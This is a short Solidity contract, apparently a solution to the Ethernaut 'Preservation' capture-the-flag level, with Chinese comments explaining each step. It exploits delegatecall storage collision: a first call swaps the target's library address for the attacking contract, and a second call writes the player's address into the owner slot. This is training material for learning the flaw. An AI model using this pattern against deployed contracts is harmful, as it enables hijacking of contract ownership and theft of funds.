// SPDX-License-Identifier: MIT
pragma solidity ^0.8.14;

import "hardhat/console.sol";

interface ILevel{
  function setFirstTime(uint _timeStamp) external;
}
contract PreservationRun {
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  
  function setTime(uint256 _time) public {
    owner = address(uint160(_time));
  }
  function run(address _runAddress, address _playerAddress) external payable {
    //调用第一次setFirstTime后，会覆盖Preservation.sol的timeZone1Library为本合约
    ILevel(_runAddress).setFirstTime(uint160(address(this)));
    
    //第二次时间是调用这个合约的setTime,但storage用的是Preservation.sol的storage的slot:3即owner
    ILevel(_runAddress).setFirstTime(uint160(_playerAddress));
  }  
}